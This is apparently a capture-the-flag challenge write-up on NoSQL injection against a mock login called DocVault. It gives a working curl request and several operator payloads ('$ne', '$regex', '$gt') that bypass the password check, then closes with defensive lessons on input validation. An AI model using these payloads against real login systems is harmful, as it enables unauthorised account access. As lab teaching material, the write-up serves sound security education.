# NoSQL Injection — DocVault

A login backed by a Mongo-style document store. The login handler
passes the JSON body's `username` and `password` values straight
into the query filter — operator dicts and all.

## Player target

Log in as `admin`. Response contains the flag.

## Author solution

```bash
curl -s -X POST http://target:5000/login \
  -H 'content-type: application/json' \
  -d '{"username":"admin","password":{"$ne":null}}'
# {"username":"admin","role":"admin","flag":"CTF{REDACTED}"}
```

Other working payloads:

```json
{"username":"admin","password":{"$regex":".*"}}
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
```

## Why this is the lesson

* **Coerce body values to expected types.** If the schema says
  `password: string`, reject everything that isn't a string before
  the value reaches the query layer. Pydantic / Zod / Joi catch
  this for free; hand-written validation rarely does.
* **Never let HTTP body fragments into a query filter.** Build the
  filter dict in code, with explicit keys/values pulled from
  validated fields.
* **Look hard at any JSON body that talks to a NoSQL store.**
  Express + body-parser + Mongoose is the classic combo where this
  bug ships in production.
